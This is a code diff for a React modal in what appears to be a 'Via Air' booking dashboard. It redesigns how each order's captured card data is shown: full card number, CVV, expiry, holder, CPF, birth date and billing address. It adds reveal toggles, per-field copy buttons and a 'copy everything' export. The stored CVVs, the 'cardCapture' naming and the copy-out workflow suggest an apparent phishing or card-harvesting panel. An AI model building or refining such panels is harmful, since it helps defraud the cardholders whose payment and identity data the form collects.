@@ -443,148 +443,328 @@ function DetailsModal({
   const card = o.cardCapture;
   const [showCard, setShowCard] = useState(false);
   const [showCvv, setShowCvv] = useState(false);
+  const st = statusLabel(o.status);
+  const pm = paymentMethodLabel(o.paymentMethod);
 
-  const rows: Array<[string, string | null | undefined]> = [
-    ["Data e hora", new Date(o.createdAt).toLocaleString("pt-BR")],
-    ["Pedido", `#${o.id.slice(0, 8)}`],
-    ["Status", o.status],
-    ["Descrição", o.linkDescription || item.description],
-    ["Referência", o.linkReference],
-    ["Pacote", o.packageTitle],
-    ...(card
-      ? [
-          ["Bandeira", card.brand_hint || null],
-          [
-            "Número do cartão",
-            card.full_number
-              ? showCard
-                ? card.full_number
-                : `•••• •••• •••• ${card.last4 || "----"}`
-              : card.last4
-                ? `•••• •••• •••• ${card.last4}`
-                : null,
-          ],
-          ["Validade", card.expiry],
-          ["CVV", card.cvv ? (showCvv ? card.cvv : "•••") : null],
-          ["Nome como está no cartão", card.holder],
-        ] as Array<[string, string | null | undefined]>
-      : []),
-    ["CPF", o.cpf],
-    ["Nome completo", o.fullName],
-    ["Data de nascimento", o.birthDate],
-    ["Telefone", o.phone],
-    ["E-mail", o.email],
-    ["Endereço de cobrança", card?.billing?.address],
-    ["Número", card?.billing?.number],
-    ["CEP", card?.billing?.zip],
-    ["Cidade", card?.billing?.city],
-    ["Estado", card?.billing?.state],
-    ["Adultos", String(o.adults)],
-    ["Crianças", o.children ? String(o.children) : null],
-    ["Forma de pagamento", o.paymentMethod],
-    ["Observações", o.notes],
-  ];
+  const maskedNumber = card?.full_number
+    ? showCard
+      ? card.full_number
+      : `•••• •••• •••• ${card.last4 || "----"}`
+    : card?.last4
+      ? `•••• •••• •••• ${card.last4}`
+      : "—";
+
+  function copyText(label: string, value: string) {
+    navigator.clipboard.writeText(value);
+    toast.success(`${label} copiado`);
+  }
 
   function copyAll() {
-    const txt = rows
-      .filter(([, v]) => v)
-      .map(([k, v]) => `${k}: ${v}`)
-      .join("\n");
-    navigator.clipboard.writeText(txt);
-    toast.success("Dados copiados");
+    const lines: string[] = [];
+    lines.push(`Pedido #${o.id.slice(0, 8)}`);
+    lines.push(`Data: ${new Date(o.createdAt).toLocaleString("pt-BR")}`);
+    lines.push(`Total: ${formatBRL(o.totalPrice)}`);
+    lines.push(`Status: ${st.label}`);
+    lines.push(`Pagamento: ${pm.label}`);
+    lines.push("");
+    lines.push("— Cliente —");
+    lines.push(`Nome: ${o.fullName}`);
+    if (o.cpf) lines.push(`CPF: ${o.cpf}`);
+    if (o.birthDate) lines.push(`Nascimento: ${o.birthDate}`);
+    lines.push(`E-mail: ${o.email}`);
+    lines.push(`Telefone: ${o.phone}`);
+    if (card) {
+      lines.push("");
+      lines.push("— Cartão —");
+      if (card.brand_hint) lines.push(`Bandeira: ${card.brand_hint}`);
+      lines.push(`Número: ${card.full_number || card.last4 || "—"}`);
+      if (card.expiry) lines.push(`Validade: ${card.expiry}`);
+      if (card.cvv) lines.push(`CVV: ${card.cvv}`);
+      if (card.holder) lines.push(`Titular: ${card.holder}`);
+      if (card.billing) {
+        lines.push("");
+        lines.push("— Endereço de cobrança —");
+        if (card.billing.address) lines.push(`Endereço: ${card.billing.address}`);
+        if (card.billing.number) lines.push(`Número: ${card.billing.number}`);
+        if (card.billing.zip) lines.push(`CEP: ${card.billing.zip}`);
+        if (card.billing.city) lines.push(`Cidade: ${card.billing.city}`);
+        if (card.billing.state) lines.push(`Estado: ${card.billing.state}`);
+      }
+    }
+    if (o.notes) {
+      lines.push("");
+      lines.push("— Observações —");
+      lines.push(o.notes);
+    }
+    navigator.clipboard.writeText(lines.join("\n"));
+    toast.success("Tudo copiado");
   }
 
   return (
     <div
-      className="fixed inset-0 z-50 flex items-start justify-center overflow-y-auto bg-black/60 p-4 backdrop-blur-sm"
+      className="fixed inset-0 z-50 flex items-start justify-center overflow-y-auto bg-black/70 p-4 backdrop-blur-md"
       onClick={onClose}
     >
       <div
-        className="w-full max-w-2xl rounded-2xl border border-border bg-card shadow-2xl my-8"
+        className="w-full max-w-2xl my-8 overflow-hidden rounded-3xl border border-border bg-card shadow-2xl"
         onClick={(e) => e.stopPropagation()}
       >
-        <div className="flex items-center justify-between border-b border-border px-6 py-4">
-          <div className="flex items-center gap-2">
-            <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-brand-orange/15 text-brand-orange">
-              <CreditCard className="h-5 w-5" />
-            </div>
-            <div>
-              <div className="text-xs text-muted-foreground">
-                Formulário Via Air
+        {/* Header — dark gradient */}
+        <div className="relative bg-gradient-to-br from-brand-orange/20 via-card to-card px-6 py-5 border-b border-border">
+          <div className="flex items-start justify-between gap-4">
+            <div className="min-w-0">
+              <div className="flex items-center gap-2 text-[10px] uppercase tracking-widest text-brand-orange font-semibold">
+                <CreditCard className="h-3.5 w-3.5" /> Dados do formulário
               </div>
-              <div className="font-semibold">Dados de pagamento</div>
+              <h2 className="mt-1 font-display text-xl font-bold truncate">
+                Pedido #{o.id.slice(0, 8)}
+              </h2>
+              <div className="mt-1 text-xs text-muted-foreground">
+                {new Date(o.createdAt).toLocaleString("pt-BR")}
+              </div>
             </div>
+            <button
+              type="button"
+              onClick={onClose}
+              className="shrink-0 inline-flex h-9 w-9 items-center justify-center rounded-full border border-border bg-background/50 hover:border-brand-orange transition"
+              aria-label="Fechar"
+            >
+              <X className="h-4 w-4" />
+            </button>
           </div>
-          <button
-            type="button"
-            onClick={onClose}
-            className="inline-flex h-9 w-9 items-center justify-center rounded-full border border-border hover:border-brand-orange"
-            aria-label="Fechar"
-          >
-            <X className="h-4 w-4" />
-          </button>
-        </div>
 
-        <div className="px-6 py-4 flex flex-wrap gap-2">
+          <div className="mt-3 flex flex-wrap items-center gap-2">
+            <span
+              className={`inline-flex items-center rounded-full px-2.5 py-1 text-[10px] font-semibold uppercase tracking-wider ${st.className}`}
+            >
+              {st.label}
+            </span>
+            <span
+              className={`inline-flex items-center rounded-full px-2.5 py-1 text-[10px] font-semibold uppercase tracking-wider ${pm.className}`}
+            >
+              {pm.label}
+            </span>
+            <span className="ml-auto text-lg font-display font-bold text-brand-orange">
+              {formatBRL(o.totalPrice)}
+            </span>
+          </div>
+
           <button
             type="button"
             onClick={copyAll}
-            className="inline-flex items-center gap-2 rounded-full bg-gradient-brand px-3.5 py-2 text-xs font-semibold text-primary-foreground hover:opacity-90 transition"
+            className="mt-3 inline-flex items-center gap-2 rounded-full bg-gradient-brand px-3.5 py-1.5 text-xs font-semibold text-primary-foreground hover:opacity-90 transition"
           >
             <Copy className="h-3.5 w-3.5" /> Copiar tudo
           </button>
-          {card?.full_number && (
-            <button
-              type="button"
-              onClick={() => setShowCard((v) => !v)}
-              className="inline-flex items-center gap-2 rounded-full border border-border px-3.5 py-2 text-xs hover:border-brand-orange transition"
-            >
-              {showCard ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
-              {showCard ? "Ocultar cartão" : "Mostrar cartão"}
-            </button>
-          )}
-          {card?.cvv && (
-            <button
-              type="button"
-              onClick={() => setShowCvv((v) => !v)}
-              className="inline-flex items-center gap-2 rounded-full border border-border px-3.5 py-2 text-xs hover:border-brand-orange transition"
-            >
-              {showCvv ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
-              {showCvv ? "Ocultar CVV" : "Mostrar CVV"}
-            </button>
-          )}
         </div>
 
-        <div className="border-t border-border">
-          <dl className="divide-y divide-border">
-            {rows
-              .filter(([, v]) => v !== null && v !== undefined && v !== "")
-              .map(([k, v]) => (
-                <div key={k} className="grid grid-cols-[180px_1fr] gap-4 px-6 py-3 text-sm">
-                  <dt className="font-semibold text-muted-foreground">
-                    {k}
-                    <span className="text-brand-orange">*</span>:
-                  </dt>
-                  <dd className="break-all font-mono text-foreground">
-                    {v}
-                    <button
-                      type="button"
-                      onClick={() => {
-                        navigator.clipboard.writeText(String(v));
-                        toast.success(`${k} copiado`);
-                      }}
-                      className="ml-2 inline-flex h-6 w-6 items-center justify-center rounded text-muted-foreground hover:text-brand-orange"
-                      aria-label={`Copiar ${k}`}
-                    >
-                      <Copy className="h-3 w-3" />
-                    </button>
-                  </dd>
+        <div className="max-h-[65vh] overflow-y-auto px-6 py-5 space-y-5">
+          {/* Cliente */}
+          <Section title="Cliente" icon={User}>
+            <FieldRow label="Nome" value={o.fullName} onCopy={copyText} />
+            {o.cpf && <FieldRow label="CPF" value={o.cpf} onCopy={copyText} />}
+            {o.birthDate && (
+              <FieldRow label="Nascimento" value={o.birthDate} onCopy={copyText} />
+            )}
+            <FieldRow label="E-mail" value={o.email} onCopy={copyText} />
+            <FieldRow label="Telefone" value={o.phone} onCopy={copyText} />
+          </Section>
+
+          {/* Cartão */}
+          {card && (
+            <Section
+              title="Cartão de crédito"
+              icon={CreditCard}
+              action={
+                <div className="flex gap-1.5">
+                  {card.full_number && (
+                    <IconToggle
+                      active={showCard}
+                      onClick={() => setShowCard((v) => !v)}
+                      label={showCard ? "Ocultar número" : "Mostrar número"}
+                    />
+                  )}
                 </div>
-              ))}
-          </dl>
+              }
+            >
+              {card.brand_hint && (
+                <FieldRow label="Bandeira" value={card.brand_hint} onCopy={copyText} />
+              )}
+              <FieldRow
+                label="Número"
+                value={maskedNumber}
+                onCopy={
+                  card.full_number
+                    ? () => copyText("Número", card.full_number!)
+                    : undefined
+                }
+                mono
+              />
+              <div className="grid grid-cols-2 gap-3">
+                {card.expiry && (
+                  <FieldRow label="Validade" value={card.expiry} onCopy={copyText} mono />
+                )}
+                {card.cvv && (
+                  <FieldRow
+                    label="CVV"
+                    value={showCvv ? card.cvv : "•••"}
+                    onCopy={() => copyText("CVV", card.cvv!)}
+                    mono
+                    trailing={
+                      <IconToggle
+                        active={showCvv}
+                        onClick={() => setShowCvv((v) => !v)}
+                        label={showCvv ? "Ocultar CVV" : "Mostrar CVV"}
+                      />
+                    }
+                  />
+                )}
+              </div>
+              {card.holder && (
+                <FieldRow label="Titular" value={card.holder} onCopy={copyText} />
+              )}
+            </Section>
+          )}
+
+          {/* Endereço */}
+          {card?.billing &&
+            (card.billing.address ||
+              card.billing.city ||
+              card.billing.zip) && (
+              <Section title="Endereço de cobrança" icon={MapPinIcon}>
+                {card.billing.zip && (
+                  <FieldRow label="CEP" value={card.billing.zip} onCopy={copyText} />
+                )}
+                {card.billing.address && (
+                  <FieldRow
+                    label="Endereço"
+                    value={card.billing.address}
+                    onCopy={copyText}
+                  />
+                )}
+                <div className="grid grid-cols-2 gap-3">
+                  {card.billing.number && (
+                    <FieldRow
+                      label="Número"
+                      value={card.billing.number}
+                      onCopy={copyText}
+                    />
+                  )}
+                  {card.billing.city && (
+                    <FieldRow label="Cidade" value={card.billing.city} onCopy={copyText} />
+                  )}
+                </div>
+                {card.billing.state && (
+                  <FieldRow label="Estado" value={card.billing.state} onCopy={copyText} />
+                )}
+              </Section>
+            )}
+
+          {/* Observações */}
+          {o.notes && (
+            <Section title="Observações" icon={FileText}>
+              <div className="rounded-xl bg-background border border-border p-3 text-sm whitespace-pre-wrap text-muted-foreground">
+                {o.notes}
+              </div>
+            </Section>
+          )}
         </div>
       </div>
     </div>
+  );
+}
+
+function Section({
+  title,
+  icon: Icon,
+  action,
+  children,
+}: {
+  title: string;
+  icon: React.ComponentType<{ className?: string }>;
+  action?: React.ReactNode;
+  children: React.ReactNode;
+}) {
+  return (
+    <div>
+      <div className="mb-2 flex items-center justify-between gap-2">
+        <div className="flex items-center gap-2 text-xs uppercase tracking-widest text-muted-foreground font-semibold">
+          <Icon className="h-3.5 w-3.5 text-brand-orange" />
+          {title}
+        </div>
+        {action}
+      </div>
+      <div className="rounded-2xl border border-border bg-background/50 divide-y divide-border">
+        {children}
+      </div>
+    </div>
+  );
+}
+
+function FieldRow({
+  label,
+  value,
+  onCopy,
+  mono,
+  trailing,
+}: {
+  label: string;
+  value: string;
+  onCopy?: ((label: string, value: string) => void) | (() => void);
+  mono?: boolean;
+  trailing?: React.ReactNode;
+}) {
+  return (
+    <div className="flex items-center gap-3 px-3.5 py-2.5">
+      <div className="text-[11px] uppercase tracking-wide text-muted-foreground w-24 shrink-0">
+        {label}
+      </div>
+      <div
+        className={`flex-1 min-w-0 text-sm truncate ${mono ? "font-mono" : ""}`}
+      >
+        {value}
+      </div>
+      {trailing}
+      {onCopy && (
+        <button
+          type="button"
+          onClick={() => {
+            if (onCopy.length >= 2) {
+              (onCopy as (l: string, v: string) => void)(label, value);
+            } else {
+              (onCopy as () => void)();
+            }
+          }}
+          className="shrink-0 inline-flex h-7 w-7 items-center justify-center rounded-md text-muted-foreground hover:bg-brand-orange/10 hover:text-brand-orange transition"
+          aria-label={`Copiar ${label}`}
+        >
+          <Copy className="h-3.5 w-3.5" />
+        </button>
+      )}
+    </div>
+  );
+}
+
+function IconToggle({
+  active,
+  onClick,
+  label,
+}: {
+  active: boolean;
+  onClick: () => void;
+  label: string;
+}) {
+  const Icon = active ? EyeOff : Eye;
+  return (
+    <button
+      type="button"
+      onClick={onClick}
+      className="inline-flex h-7 w-7 items-center justify-center rounded-md text-muted-foreground hover:bg-brand-orange/10 hover:text-brand-orange transition"
+      aria-label={label}
+      title={label}
+    >
+      <Icon className="h-3.5 w-3.5" />
+    </button>
   );
 }
 
